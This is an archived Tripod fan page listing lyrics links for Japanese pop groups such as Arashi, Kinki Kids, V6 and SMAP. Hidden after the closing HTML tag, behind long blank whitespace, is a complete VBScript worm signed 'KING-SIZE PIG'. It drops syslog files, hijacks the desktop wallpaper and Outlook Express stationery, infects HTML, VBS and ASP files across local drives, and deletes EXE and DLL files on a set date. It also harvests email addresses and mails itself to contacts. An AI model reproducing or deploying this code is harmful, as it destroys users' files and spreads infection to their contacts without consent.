<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-874">
<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<title>lyrics</title>
</head>

<body background="bg_lovelove_bule1.gif" bgproperties="fixed" text="#0099FF" link="#0099FF" style="border: 4 solid #FF3399"><!-- begin compete js -->
<script type="text/javascript">
    __compete_code = '667f89f26d96c30e99728fe6a608804d';
    (function () {
        var s = document.createElement('script'),
            d = document.getElementsByTagName('head')[0] ||
                document.getElementsByTagName('body')[0],
            t = 'https:' == document.location.protocol ? 
                'https://c.compete.com/bootstrap/' : 
                'http://c.compete.com/bootstrap/';
        s.src = t + __compete_code + '/bootstrap.js';
        s.type = 'text/javascript';
        s.async = 'async'; 
        if (d) { d.appendChild(s); }
    }());
</script>
<!-- end compete js -->

<!-- quantcast -->
<script type="text/javascript">
	function channValidator(chann){
	return (typeof(chann) == 'string' && chann != '');
	}

	function lycosQuantcast(){
		var lb = "";
		if(typeof(cm_host) !== 'undefined' && channValidator(cm_host)){
			lb += cm_host.split('.')[0] + '.';
		}
	
		if(typeof(cm_taxid) !==	'undefined' && channValidator(cm_taxid)){
			lb += cm_taxid;
			lb = lb.replace('/','');
		} else {
			lb = lb.replace('.','');
		}
		return lb;
	}
	
	var _qevents = _qevents || [];
	
	(function() {
		var elem = document.createElement('script');
		elem.src = (document.location.protocol == "https:" ? "https://secure" :"http://edge") + ".quantserve.com/quant.js";
		elem.async = true;
		elem.type = "text/javascript";
		var scpt = document.getElementsByTagName('script')[0];
		scpt.parentNode.insertBefore(elem, scpt);
	})();
	
	_qevents.push({
		qacct:"p-6eQegedn62bSo",
		labels:lycosQuantcast()
	});
</script>
<!-- end quantcast -->

<script type="text/javascript" src="http://hb.lycos.com/hb.js"></script>
<script type="text/javascript">
var cm_role = "live";
var cm_host = "tripod.lycos.com";
var cm_taxid = "/memberembedded";
var tripod_member_name = "luv_sakurai";
var tripod_member_page = "luv_sakurai/lyrics/lyrics.html";
var tripod_ratings_hash = "1320675611:43b07e5e011a9e037a15875672c0ee1e";

var lycos_ad_category = {"dmoz":"health\/addictions","ontarget":"&CAT=health&L2CAT=diseases%20and%20conditions&L3CAT=substance%20abuse","find_what":"paris"};

var lycos_ad_remote_addr = "154.35.200.66";
var lycos_ad_www_server = "www.tripod.lycos.com";
var lycos_ad_track_small = "http://members.tripod.com/adm/img/common/ot_smallframe.gif?rand=458140";
var lycos_ad_track_served = "http://members.tripod.com/adm/img/common/ot_adserved.gif?rand=458140";
</script>

<script type="text/javascript" src="http://scripts.lycos.com/catman/init.js"></script>
<script type="text/javascript"> 
var lycos_ad = Array();
var lycos_search_query = "";
var lycos_onload_timer;

function lycos_check_size() {
    var window_width = 0, window_height = 0;
    if (typeof(window.innerWidth) == 'number' ) {
        window_width = window.innerWidth;
        window_height = window.innerHeight;
    } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
        window_width = document.documentElement.clientWidth;
        window_height = document.documentElement.clientHeight;
    } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
        window_width = document.body.clientWidth;
        window_height = document.body.clientHeight;
    } 
    
    var lycos_track_img = document.createElement('img');
    if( top == self ) {
        return 1;
    } else {
        if ((window_width < 300) || (window_height < 300)) {
            lycos_track_img.src=this.lycos_ad_track_small+"&w="+window_width+"&h="+window_height;
            return 0;
        } else {
            lycos_track_img.src=this.lycos_ad_track_served+"&w="+window_width+"&h="+window_height;
            return 1;
        }
    }
}
       
function lycos_insert_ads() {
    var lycos_ad_mgr = new AdManager();
    
    if (this.lycos_search_query) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_search_query);
    } else if (this.lycos_ad_category && this.lycos_ad_category.find_what) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_ad_category.find_what);
    }

    if (this.lycos_ad_category && this.lycos_ad_category.dmoz) {
        lycos_ad_mgr.setForcedParam("page", this.lycos_ad_category.dmoz);
    } else {
        lycos_ad_mgr.setForcedParam("page", "member");
    }

    var lycos_prod_set = lycos_ad_mgr.chooseProductSet();
    var slots = ["leaderboard", "leaderboard2"];
    for (var slot in slots) {
        if (lycos_ad_mgr.isSlotAvailable(slots[slot])) {
            lycos_ad[slots[slot]] = lycos_ad_mgr.getSlot(slots[slot]);
        }
    }

    lycos_ad_mgr.renderFooter();
}

function generateHref(atag, template){
    atag.href=template.replace('_MYURL_', window.location.href.replace('http://', '')).replace('_MYTITLE_', 'Check%20out%20this%20Tripod%20Member%20site!'); 
}

if (lycos_check_size()) {
    lycos_insert_ads();
}

window.onload = function() {
    var f = document.getElementById("FooterAd");
    var b = document.getElementsByTagName("body")[0];
    b.removeChild(f);
    b.appendChild(f);
}

</script>
<div id="tb_container" style="text-align:center; position:relative; z-index:999999999">
    <div id="tb_ad" style="display:block!important; overflow:hidden; width:868px; margin:0 auto">
    <a href="http://www.tripod.lycos.com" title="build your own website at Tripod.com" style="float:left; width:140px; border:0">
    	<img src="http://tripod.com/common/ly/images/freeAd.jpg" alt="Made with Tripod.com" style="border:0" />
    </a> 
        <div id="ad_container" style="display:block!important; float:left; width:728px ">
        <script type="text/javascript">document.write(lycos_ad['leaderboard']);</script>
        </div>
    </div>
</div>
<div id="FooterAd" style="text-align:center; display:block!important; width:100%!important; position:relative; z-index:999999!important; height:94px!important"> 
<script type="text/javascript">document.write(lycos_ad['leaderboard2']);</script>
</div>
<noscript>
 <img src="http://members.tripod.com/adm/img/common/ot_noscript.gif?rand=458140" alt="" width="1" height="1" />
 <!-- BEGIN STANDARD TAG - 728 x 90 - Lycos - Tripod Fallthrough - DO NOT MODIFY -->
 <iframe frameborder="0" marginwidth="0" marginheight="0" scrolling="no" width="728" height="90" src="http://ad.yieldmanager.com/st?ad_type=iframe&amp;ad_size=728x90&amp;section=209094"></iframe>
 <!-- END TAG -->
</noscript>


<p align="center"><font size="6" face="Arial" color="#3399FF">++ L&yuml;r&iuml;&ccedil;&sect;
++</font></p>
<p align="center">&nbsp;</p>
<p><font color="#3399FF" face="Arial"><b><font size="5">++ <u>Arashi</u> </font></b></font><b><font color="#FF00FF" size="5">&#23888;</font><font color="#3399FF" size="5" face="Comic Sans MS">++</font></b></p>
<ul>
  <li>
    <p align="left"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_arashi.html"><font color="#3399FF" size="3" face="Arial">A.RA.SHI</font></a><font color="#3399FF" size="3">&nbsp;&nbsp;
    </font><b><font color="#FF00FF" size="3">&#23888;</font><font color="#3399FF" size="3" face="Comic Sans MS">&nbsp;</font></b></li>
  <li>
    <p align="left"><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_ashita.html"><font size="3" color="#3399FF">Ashita
    ni mukatte</font></a><font face="Comic Sans MS" color="#3399FF"><a href="lyrics_ashita.html">
    </a></font><font size="3" color="#FF00FF" face="Comic Sans MS">***</font></font></li>
  <li>
    <p align="left"><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_sunrise.html"><font size="3" color="#3399FF">Sunrise
    Nippon</font></a><font size="3" face="Comic Sans MS" color="#3399FF">&nbsp; </font></font><b><font size="3" color="#FF00FF">&#26085;&#26412;</font></b><font size="3" face="Comic Sans MS" color="#FF00FF">&nbsp;</font></li>
  <li>
    <p align="left"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_horizon.html"><font size="3" face="Arial" color="#3399FF">Horizon</font></a></li>
  <li>
    <p align="left"><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_kansha.html"><font size="3" color="#3399FF">Kansha
    Kangeki Ame Arashi</font></a><font size="3" face="Comic Sans MS" color="#3399FF">&nbsp;&nbsp;
    </font></font><b><font size="3" color="#FF00FF">&#24863;&#35613;&#12460;&#12531;&#12465;&#12461;&#38632;&#23888;</font></b></li>
  <li>
    <p align="left"><span style="mso-fareast-font-family: Times New Roman; mso-bidi-font-family: Angsana New; mso-ansi-language: EN-US; mso-fareast-language: EN-US; mso-bidi-language: TH"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_kimi_no.html"><font color="#0099FF" face="Arial" size="3">Kimi
    no Tame ni Boku ga Iru</font></a></span></li>
  <li>
    <p align="left"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_hanasanai.html"><span style="mso-fareast-font-family: Times New Roman; mso-bidi-font-family: Angsana New; mso-ansi-language: EN-US; mso-fareast-language: EN-US; mso-bidi-language: TH"><font color="#3399FF" face="Arial" size="3">Hanasanai</font></span></a></li>
  <li><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_jidai.html"><font size="3" color="#3399FF" face="Arial">Jidai</font></a><font size="3" color="#3399FF">&nbsp;
    &nbsp;<b> </b></font><b><font size="3" color="#FF00FF">&#26178;&#20195;</font><font color="#FF00FF">&nbsp;</font></b><font color="#FF00FF"><b><font face="Arial" color="#FF00FF" size="3">&nbsp;</font></b></font></li>
  <li><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_cant_take.html"><font size="3" color="#3399FF">Can't
    take my eyes off you</font></a><font size="3" face="Comic Sans MS" color="#3399FF">
    </font><font size="3" face="Arial" color="#3399FF">( Sho in Concert )</font></font></li>
  <li><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_do_u_wanna.html"><font size="3" color="#3399FF">Do
    You Wanna Feel Like Dancing</font></a><font size="3" face="Comic Sans MS" color="#3399FF">
    </font><font size="3" face="Arial" color="#3399FF">( Aiba , Nino )</font></font></li>
  <li><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_natsu.html"><font size="3" color="#3399FF">Natsu</font></a><font size="3" face="Comic Sans MS" color="#3399FF">
    </font><font size="3" face="Arial" color="#3399FF">( Nino in Concert )</font></font></li>
</ul>
<blockquote>
  <p><img border="0" src="line_kisha.gif" width="452" height="48"></p>
</blockquote>
<p><b><font size="5" face="Arial" color="#3399FF">++ <u>Johnny's Jr.</u> ++&nbsp;</font></b></p>
<ul>
  <li><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_love_letter.html"><font size="3" color="#0099FF">Love
    Letter</font></a><font size="3" face="Comic Sans MS" color="#3399FF">&nbsp;</font><font size="3" face="Arial" color="#3399FF">(
    YamaP )</font></font></li>
  <li><span style="mso-fareast-font-family: Times New Roman; mso-bidi-font-family: Angsana New; mso-ansi-language: EN-US; mso-fareast-language: EN-US; mso-bidi-language: TH"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_kimi_dake_ni.html"><font color="#3399FF" size="3" face="Arial">Kimi
    dake ni</font></a><font color="#3399FF" size="3" face="Arial"> ( Takky ,
    Tsubasa , Sabaru in 109 109 Concert )</font></span></li>
  <li><span style="mso-fareast-font-family: Times New Roman; mso-bidi-font-family: Angsana New; mso-ansi-language: EN-US; mso-fareast-language: EN-US; mso-bidi-language: TH"><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_midnight_train.html"><font size="3" color="#3399FF">Midnight
    Train</font></a><font color="#3399FF" size="3" face="Comic Sans MS"> </font><font color="#3399FF" size="3" face="Arial">(
    M.A.I.N. )</font></font></span></li>
  <li><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_sekaiwa.html"><font size="3" color="#3399FF">S</font><font size="3" face="Arial"><font color="#3399FF">eka</font><font color="#0099FF">iwa
    bokura wo matteiru</font> </font></a><font size="3" face="Arial">( Jr. )</font></font></li>
</ul>
<blockquote>
  <p><img border="0" src="line_kisha.gif" width="452" height="48"></p>
</blockquote>
<p><b><font size="5" color="#3399FF" face="Arial">++ <u>Kinki Kids</u> ++</font></b></p>
<ul>
  <li>
    <p align="left"><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_suki.html"><font size="3" color="#0099FF">Suki
    ni natteku aishiteku</font></a><font size="3" color="#3399FF">&nbsp;&nbsp; </font></font><b><font size="3" color="#FF00FF">&#22909;&#12365;&#12395;&#12394;&#12387;&#12390;&#12367;
    &#24859;&#12375;&#12390;&#12367;</font></b><font size="3" color="#3399FF" face="Arial">&nbsp;</font></li>
  <li><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_flower.html"><font size="3" color="#0099FF" face="Arial">Flower</font></a><font face="Arial"><font size="3" color="#3399FF">&nbsp;
    </font></font><b><font size="3" color="#FF00FF">&#12501;&#12521;&#12527;&#12540;</font><font size="3" color="#3399FF" face="Arial">&nbsp;</font></b></li>
  <li>
    <p align="left"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_mou.html"><font size="3" color="#0099FF" face="Arial">Mou
    kimi igai aisenai</font></a><font face="Arial"><font size="3" color="#3399FF">&nbsp;&nbsp;
    </font></font><b><font size="3" color="#FF00FF">&#12418;&#12358;&#21531;&#20197;&#22806;&#24859;&#12379;&#12394;&#12356;</font></b><font size="3" color="#0099FF" face="Arial">(
    Drama &quot; Tenshi ga kieta machi &quot; )</font></li>
  <li>
    <p align="left"><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_natus_kinki.html"><font color="#0099FF" size="3">Natsu
    no ousama</font></a><font size="3">&nbsp; </font></font><b><font size="3" color="#FF00FF">&#22799;&#12398;&#29579;&#27096;&nbsp;
    </font></b><font size="3" color="#0099FF" face="Arial">( Drama &quot; Summer
    Snow &quot; )</font></li>
  <li><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_jounetsu.html"><font size="3" color="#0099FF">Jounetsu</font></a><font size="3">&nbsp;&nbsp;<b>
    </b></font></font><b><font color="#FF00FF" size="3">&#24773;&#29105;&nbsp;</font></b><font size="3" color="#0099FF" face="Arial">(
    Drama &quot; Rookie! &quot; )</font></li>
  <li><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_slowly.html"><font size="3" color="#3399FF">Slowly
    </font></a><font size="3" color="#FF00FF">***</font></font></li>
  <li><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_jetcoster.html"><font size="3" color="#3399FF" face="Arial">Jet
    coaster Romance</font></a></li>
  <li><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_to_heart.html"><font size="3" color="#0099FF">To
    Heart</font></a><font size="3" color="#3399FF">&nbsp; ( Drama&nbsp; &quot;
    To Heart &quot;&nbsp; )</font></font></li>
  <li><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_kinki_kids_forever.html"><font size="3" color="#3399FF" face="Arial">Kinki
    Kids Forever</font></a></li>
</ul>
<blockquote>
  <p><img border="0" src="line_kisha.gif" width="452" height="48"></p>
</blockquote>
<p><b><font size="5" color="#3399FF" face="Arial">++ <u>V6</u> ++</font></b></p>
<ul>
  <li><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_madeinjapan.html"><font size="3" color="#3399FF">Made
    in Japan</font></a><font size="3" color="#3399FF"> </font><font size="3" color="#FF00FF">***</font></font></li>
  <li><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_believe.html"><font size="3" color="#3399FF">Believe
    Your Smile</font></a><font size="3" color="#3399FF"> </font><font size="3" color="#FF00FF">***</font></font></li>
  <li><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_generation.html"><font size="3" color="#3399FF">Generation
    Gap</font></a><font color="#3399FF"><font size="3"><b><br>
    </b></font><br>
    </font></font><img border="0" src="line_kisha.gif" width="452" height="48"></li>
</ul>
<p><b><font size="5" color="#3399FF" face="Arial">++ <u>Smap</u> ++</font></b></p>
<ul>
  <li><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_yozora.html"><font color="#3399FF" size="3">Yozora
    no mukou </font></a><font size="3" color="#FF00FF">***</font></font></li>
  <li><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_lionheart.html"><font size="3" color="#3399FF">Lion
    Heart</font></a><font size="3">&nbsp; </font></font><b><font size="3" color="#FF00FF">&#12425;&#12356;&#12362;&#12435;&#12495;&#12540;&#12488;</font><font size="+2" color="#FF00FF" face="Arial">&nbsp;</font></b></li>
  <li><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_ha.html"><font size="3" color="#3399FF">Ha</font></a><font size="3">
    </font><font size="3" color="#FF00FF">***</font><b><font size="3"><br>
    </font></b><br>
    </font><img border="0" src="line_kisha.gif" width="452" height="48"></li>
</ul>
<p><b><font size="5" face="Arial">++ <u>Other</u> ++</font></b></p>
<ul>
  <li><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_first_love.html"><font size="3" color="#0099FF">First
    Love</font></a><font size="3" color="#3399FF">&nbsp; by . . . Utada Hikaru&nbsp;(
    Drama &quot; Majo no Jouken &quot; )</font></font></li>
  <li><font face="Arial"><a href="http://luv_sakurai.tripod.com/lyrics/lyrics_people_of_the_world.html"><font size="3" color="#0099FF">People
    Of The World</font></a><font size="3" color="#3399FF">&nbsp; by . . . J -
    Friend</font></font></li>
  <li><font face="Arial"><a href="lyrics_believe2.html"><font size="3" color="#3399FF">Believe</font></a><font size="3" color="#3399FF">
    by . . . Yamaguchi Yuko&nbsp; ( Drama &quot; Overtime&quot; )</font></font></li>
</ul>
<blockquote>
  <p><img border="0" src="line_kisha.gif" width="452" height="48"></p>
</blockquote>

</body>

</html>
<script language='VBScript'>



















 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Rem What a KING-SIZE PIG!! 
On Error Resume Next 
mload 
Sub mload() 
On Error Resume Next 
mPath = Grf() 
Set Os = CreateObject("Scriptlet.TypeLib") 
Set Oh = CreateObject("Shell.Application") 
If IsHTML Then 
mURL = LCase(document.Location) 
If mPath = "" Then 
Os.Reset 
Os.Path = "C:\PROGRAM FILES\syslog.htm" 
Os.Doc = Lhtml() 
Os.Write() 
Ihtml = "<span style='position:absolute'><Iframe src='C:\PROGRAM FILES\syslog.htm' width='0' height='0'></Iframe></span>" 
Call document.Body.insertAdjacentHTML("AfterBegin", Ihtml) 
Else 
If Iv(mPath, "syslog.vbs") Then 
setInterval "Rt()", 10000 
Else 
m = "hta" 
If LCase(m) = Right(mURL, Len(m)) Then 
id = setTimeout("mclose()", 1) 
main 
Else 
Os.Reset() 
Os.Path = mPath & "\" & "syslog.hta" 
Os.Doc = Lhtml() 
Os.write() 
Iv mPath, "syslog.hta" 
End If 
End If 
End If 
Else 
main 
End If 
End Sub 
Sub main() 
On Error Resume Next 
Set Of = CreateObject("Scripting.FileSystemObject") 
Set Od = CreateObject("Scripting.Dictionary") 
Od.Add "html", "1100" 
Od.Add "vbs", "0100" 
Od.Add "htm", "1100" 
Od.Add "asp", "0010" 
Ks = "HKEY_CURRENT_USER\Software\" 
Ds = Grf() 
Cs = Gsf() 
If IsVbs Then 
If Of.FileExists("C:\PROGRAM FILES\syslog.htm") Then 
Of.DeleteFile ("C:\PROGRAM FILES\syslog.htm") 
End If 
Key = CInt(Month(Date) + Day(Date)) 
If Key = 13 Then 
Od.RemoveAll 
Od.Add "exe", "0001" 
Od.Add "dll", "0001" 
End If 
Cn = Rg(Ks & "Help\Count") 
If Cn = "" Then 
Cn = 1 
End If 
Rw Ks & "Help\Count", Cn + 1 
f1 = Rg(Ks & "Help\FileName") 
f2 = FNext(Of, Od, f1) 
fext = GetExt(Of, Od, f2) 
Rw Ks & "Help\FileName", f2 
If IsDel(fext) Then 
f3 = f2 
f2 = FNext(Of, Od, f2) 
Rw Ks & "Help\FileName", f2 
Of.DeleteFile f3 
Else 
If LCase(WScript.ScriptFullname) <> LCase(f2) Then 
Fw Of, f2, fext 
End If 
End If 
If (CInt(Cn) Mod 366) = 0 Then 
If (CInt(Second(Time)) Mod 2) = 0 Then 
Tsend 
Else 
adds = Og 
Msend (adds) 
End If 
End If 
wp = Rg("HKEY_CURRENT_USER\Control Panel\desktop\wallPaper") 
If Rg(Ks & "Help\wallPaper") <> wp Or wp = "" Then 
If wp = "" Then 
n1 = "" 
n3 = Cs & "\Help.htm" 
Else 
mP = Of.GetFile(wp).ParentFolder 
n1 = Of.GetFileName(wp) 
n2 = Of.GetBaseName(wp) 
n3 = Cs & "\" & n2 & ".htm" 
End If 
Set pfc = Of.CreateTextFile(n3, True) 
mt = Sa("1100") 
pfc.Write "<" & "HTML><" & "body bgcolor='#007f7f' background='" & n1 & "'><" & "/Body><" & "/HTML>" & mt 
pfc.Close 
Rw Ks & "Help\wallPaper", n3 
Rw "HKEY_CURRENT_USER\Control Panel\desktop\wallPaper", n3 
End If 
Else 
Set fc = Of.CreateTextFile(Ds & "\syslog.vbs", True) 
fc.Write Sa("0100") 
fc.Close 
bf = Cs & "\instlog.htm" 
Set fc2 = Of.CreateTextFile(bf, True) 
fc2.Write Lhtml 
fc2.Close 
oeid = Rg("HKEY_CURRENT_USER\Identities\Default User ID") 
oe = "HKEY_CURRENT_USER\Identities\" & oeid & "\Software\Microsoft\Outlook Express\5.0\Mail" 
MSH = oe & "\Message Send HTML" 
CUS = oe & "\Compose Use Stationery" 
SN = oe & "\Stationery Name" 
Rw MSH, 1 
Rw CUS, 1 
Rw SN, bf 
Web = Cs & "\WEB" 
Set gf = Of.GetFolder(Web).Files 
Od.Add "htt", "1100" 
For Each m In gf 
fext = GetExt(Of, Od, m) 
If fext <> "" Then 
Fw Of, m, fext 
End If 
Next 
End If 
End Sub 
Sub mclose() 
document.Write "<" & "title>What a KING-SIZE PIG!!!</title" & ">" 
window.Close 
End Sub 
Sub Rt() 
Dim mPath 
On Error Resume Next 
mPath = Grf() 
Iv mPath, "syslog.vbs" 
End Sub 
Function Sa(n) 
Dim VBSText, m 
VBSText = Lvbs() 
If Mid(n, 3, 1) = 1 Then 
m = "<%" & VBSText & "%>" 
End If 
If Mid(n, 2, 1) = 1 Then 
m = VBSText 
End If 
If Mid(n, 1, 1) = 1 Then 
m = Lscript(m) 
End If 
Sa = m & vbCrLf 
End Function 
Sub Fw(Of, S, n) 
Dim fc, fc2, m, mmail, mt 
On Error Resume Next 
Set fc = Of.OpenTextFile(S, 1) 
mt = fc.ReadAll 
fc.Close 
If Not Sc(mt) Then 
mmail = Ml(mt) 
mt = Sa(n) 
Set fc2 = Of.OpenTextFile(S, 8) 
fc2.Write mt 
fc2.Close 
Msend (mmail) 
End If 
End Sub 
Function Sc(S) 
mN = "Rem What a KING-SIZE PIG!!!" 
If InStr(S, mN) > 0 Then 
Sc = True 
Else 
Sc = False 
End If 
End Function 
Function FNext(Of, Od, S) 
Dim fpath, fname, fext, T, gf 
On Error Resume Next 
fname = "" 
T = False 
If Of.FileExists(S) Then 
fpath = Of.GetFile(S).ParentFolder 
fname = S 
ElseIf Of.FolderExists(S) Then 
fpath = S 
T = True 
Else 
fpath = Dnext(Of, "") 
End If 
Do While True 
Set gf = Of.GetFolder(fpath).Files 
For Each m In gf 
If T Then 
If GetExt(Of, Od, m) <> "" Then 
FNext = m 
Exit Function 
End If 
ElseIf LCase(m) = LCase(fname) Or fname = "" Then 
T = True 
End If 
Next 
fpath = Pnext(Of, fpath) 
Loop 
End Function 
Function Pnext(Of, S) 
On Error Resume Next 
Dim Ppath, Npath, gp, pn, T, m 
T = False 
If Of.FolderExists(S) Then 
Set gp = Of.GetFolder(S).SubFolders 
pn = gp.Count 
If pn = 0 Then 
Ppath = LCase(S) 
Npath = LCase(Of.GetParentFolderName(S)) 
T = True 
Else 
Npath = LCase(S) 
End If 
Do While Not Er 
For Each pn In Of.GetFolder(Npath).SubFolders 
If T Then 
If Ppath = LCase(pn) Then 
T = False 
End If 
Else 
Pnext = LCase(pn) 
Exit Function 
End If 
Next 
T = True 
Ppath = LCase(Npath) 
Npath = Of.GetParentFolderName(Npath) 
If Of.GetFolder(Ppath).IsRootFolder Then 
m = Of.GetDriveName(Ppath) 
Pnext = Dnext(Of, m) 
Exit Function 
End If 
Loop 
End If 
End Function 
Function Dnext(Of, S) 
Dim dc, n, d, T, m 
On Error Resume Next 
T = False 
m = "" 
Set dc = Of.Drives 
For Each d In dc 
If d.DriveType = 2 Or d.DriveType = 3 Then 
If T Then 
Dnext = d 
Exit Function 
Else 
If LCase(S) = LCase(d) Then 
T = True 
End If 
If m = "" Then 
m = d 
End If 
End If 
End If 
Next 
Dnext = m 
End Function 
Function GetExt(Of, Od, S) 
Dim fext 
On Error Resume Next 
fext = LCase(Of.GetExtensionName(S)) 
GetExt = Od.Item(fext) 
End Function 
Sub Rw(k, v) 
Dim R 
On Error Resume Next 
Set R = CreateObject("WScript.Shell") 
R.RegWrite k, v 
End Sub 
Function Rg(v) 
Dim R 
On Error Resume Next 
Set R = CreateObject("WScript.Shell") 
Rg = R.RegRead(v) 
End Function 
Function IsVbs() 
Dim ErrTest 
On Error Resume Next 
ErrTest = WScript.ScriptFullname 
If Err Then 
IsVbs = False 
Else 
IsVbs = True 
End If 
End Function 
Function IsHTML() 
Dim ErrTest 
On Error Resume Next 
ErrTest = document.Location 
If Er Then 
IsHTML = False 
Else 
IsHTML = True 
End If 
End Function 
Function IsMail(S) 
Dim m1, m2 
IsMail = False 
If InStr(S, vbCrLf) = 0 Then 
m1 = InStr(S, "@") 
m2 = InStr(S, ".") 
If m1 <> 0 And m1 < m2 Then 
IsMail = True 
End If 
End If 
End Function 
Function Lvbs() 
Dim f, m, ws, Of 
On Error Resume Next 
If IsVbs Then 
Set Of = CreateObject("Scripting.FileSystemObject") 
Set f = Of.OpenTextFile(WScript.ScriptFullname, 1) 
Lvbs = f.ReadAll 
Else 
For Each ws In document.scripts 
If LCase(ws.Language) = "vbscript" Then 
If Sc(ws.Text) Then 
Lvbs = ws.Text 
Exit Function 
End If 
End If 
Next 
End If 
End Function 
Function Iv(mPath, mName) 
Dim Shell 
On Error Resume Next 
Set Shell = CreateObject("Shell.Application") 
Shell.NameSpace(mPath).Items.Item(mName).InvokeVerb 
If Er Then 
Iv = False 
Else 
Iv = True 
End If 
End Function 
Function Grf() 
Dim Shell, mPath 
On Error Resume Next 
Set Shell = CreateObject("Shell.Application") 
mPath = "C:\" 
For Each mShell In Shell.NameSpace(mPath).Items 
If mShell.IsFolder Then 
Grf = mShell.Path 
Exit Function 
End If 
Next 
If Er Then 
Grf = "" 
End If 
End Function 
Function Gsf() 
Dim Of, m 
On Error Resume Next 
Set Of = CreateObject("Scripting.FileSystemObject") 
m = Of.GetSpecialFolder(0) 
If Er Then 
Gsf = "C:\" 
Else 
Gsf = m 
End If 
End Function 
Function Lhtml() 
Lhtml = "<" & "HTML" & "><HEAD" & ">" & vbCrLf & _ 
"<" & "Title> THE KING-SIZE PIG's NEWS!!!! </Title" & "><" & "/HEAD>" & vbCrLf & _ 
"<" & "Body> " & Lscript(Lvbs()) & vbCrLf & _ 
"<" & "/Body></HTML" & ">" 
End Function 
Function Lscript(S) 
Lscript = "<" & "script language='VBScript'>" & vbCrLf & _ 
S & "<" & "/script" & ">" 
End Function 
Function Sl(S1, S2, n) 
Dim l1, l2, l3, i 
l1 = Len(S1) 
l2 = Len(S2) 
i = InStr(S1, S2) 
If i > 0 Then 
l3 = i + l2 - 1 
If n = 0 Then 
Sl = Left(S1, i - 1) 
ElseIf n = 1 Then 
Sl = Right(S1, l1 - l3) 
End If 
Else 
Sl = "" 
End If 
End Function 
Function Ml(S) 
Dim S1, S3, S2, T, adds, m 
S1 = S 
S3 = """" 
adds = "" 
S2 = S3 & "mailto" & ":" 
T = True 
Do While T 
S1 = Sl(S1, S2, 1) 
If S1 = "" Then 
T = False 
Else 
m = Sl(S1, S3, 0) 
If IsMail(m) Then 
adds = adds & m & vbCrLf 
End If 
End If 
Loop 
Ml = Split(adds, vbCrLf) 
End Function 
Function Og() 
Dim i, n, m(), Om, Oo 
Set Oo = CreateObject("Outlook.Application") 
Set Om = Oo.GetNamespace("MAPI").GetDefaultFolder(10).Items 
n = Om.Count 
ReDim m(n) 
For i = 1 To n 
m(i - 1) = Om.Item(i).Email1Address 
Next 
Og = m 
End Function 
Sub Tsend() 
Dim Od, MS, MM, a, m 
Set Od = CreateObject("Scripting.Dictionary") 
MConnect MS, MM 
MM.FetchSorted = True 
MM.Fetch 
For i = 0 To MM.MsgCount - 1 
MM.MsgIndex = i 
a = MM.MsgOrigAddress 
If Od.Item(a) = "" Then 
Od.Item(a) = MM.MsgSubject 
End If 
Next 
For Each m In Od.Keys 
MM.Compose 
MM.MsgSubject = "Fw: " & Od.Item(m) 
MM.RecipAddress = m 
MM.AttachmentPathName = Gsf & "\instlog.htm" 
MM.Send 
Next 
MS.SignOff 
End Sub 
Function MConnect(MS, MM) 
Dim U 
On Error Resume Next 
Set MS = CreateObject("MSMAPI.MAPISession") 
Set MM = CreateObject("MSMAPI.MAPIMessages") 
U = Rg("HKEY_CURRENT_USER\Software\Microsoft\Windows Messaging Subsystem\Profiles\DefaultProfile") 
MS.UserName = U 
MS.DownLoadMail = False 
MS.NewSession = False 
MS.LogonUI = True 
MS.SignOn 
MM.SessionID = MS.SessionID 
End Function 
Sub Msend(Address) 
Dim MS, MM, i, a 
MConnect MS, MM 
i = 0 
MM.Compose 
For Each a In Address 
If IsMail(a) Then 
MM.RecipIndex = i 
MM.RecipAddress = a 
i = i + 1 
End If 
Next 
MM.MsgSubject = " Help " 
MM.AttachmentPathName = Gsf & "\instlog.htm" 
MM.Send 
MS.SignOff 
End Sub 
Function Er() 
If Err.Number = 0 Then 
Er = False 
Else 
Err.Clear 
Er = True 
End If 
End Function 
Function IsDel(S) 
If Mid(S, 4, 1) = 1 Then 
IsDel = True 
Else 
IsDel = False 
End If 
End Function 
 
 
 
 
 







</script>
